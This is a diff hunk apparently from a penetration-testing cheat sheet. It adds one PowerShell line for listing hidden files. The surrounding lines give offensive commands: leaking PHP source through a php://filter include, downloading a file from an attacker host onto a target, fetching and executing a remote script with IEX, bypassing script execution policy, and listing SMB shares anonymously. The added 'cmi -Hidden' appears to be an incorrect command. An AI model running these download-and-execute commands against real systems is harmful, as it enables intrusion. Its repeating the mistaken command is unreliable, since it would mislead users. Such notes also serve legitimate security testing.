@@ -41,6 +41,7 @@ php://filter/convert.base64-encode/resource=$FILE -> exfiltrate .php source code
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://$IP:$PORT/$FILE','$OUTFILE')" -> download file to target system
 IEX (New-Object Net.WebClient).downloadstring("$SCRIPTURL") -> execute .ps1 script remotely
 $COMMAND | powershell -noprofile -> bypass script execution
+cmi -Hidden -> show hidden files and directories
 
 # SMB
 smbclient -N -L //$URL/ -> list shares
